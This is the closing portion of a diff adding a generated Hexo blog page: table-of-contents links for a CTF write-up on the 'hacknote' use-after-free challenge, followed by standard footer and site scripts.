toc-article-level-2"><a class="toc-article-link" href="#%E6%9C%89%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-article-text">有关系统调用的知识点</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#hacknote-UAF"><span class="toc-article-text">hacknote(UAF)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-article-text">解题步骤</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#uaf%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">uaf介绍</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8E%A8%E8%8D%90%E7%BD%91%E5%9D%80"><span class="toc-article-text">推荐网址</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 John Doe's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
